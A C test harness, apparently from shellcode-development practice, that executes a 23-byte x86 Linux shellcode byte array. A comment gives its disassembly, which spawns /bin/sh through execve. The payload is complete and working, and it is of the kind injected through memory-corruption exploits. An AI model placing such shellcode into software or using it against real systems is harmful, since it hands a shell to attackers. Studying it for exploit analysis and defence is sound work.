int main(int argc, char **argv)
{
  char code[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
  ((void(*)()) code)();
}

/*

shellcode4:     file format elf32-i386


Disassembly of section .text:

08048058 <_start>:
 8048058:	31 c0                	xor    eax,eax
 804805a:	50                   	push   eax
 804805b:	68 2f 2f 73 68       	push   0x68732f2f
 8048060:	68 2f 62 69 6e       	push   0x6e69622f
 8048065:	b0 0b                	mov    al,0xb
 8048067:	89 e3                	mov    ebx,esp
 8048069:	31 c9                	xor    ecx,ecx
 804806b:	31 d2                	xor    edx,edx
 804806d:	cd 80                	int    0x80
 804806f:	90                   	nop
*/
